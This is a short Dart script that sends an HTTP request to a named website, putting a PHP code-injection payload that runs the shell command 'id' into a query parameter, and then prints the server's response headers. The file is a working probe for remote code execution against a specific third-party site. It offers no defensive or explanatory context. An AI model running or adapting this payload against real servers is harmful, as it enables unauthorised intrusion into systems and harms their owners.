import 'package:http/http.dart' as http;
void main(List<String> arguments) async{
  final omedada='https://omedadplc.com/index.php?a=<?=system("id");?>';
  try{
    var result=await http.get(Uri.parse(omedada));
    if(result.statusCode==200){
      result.headers.forEach((key,value){
        print("$key: $value");
      });
    } else{
      print("Not Found");
    }
  }catch(e){
    print(e);
  }
}
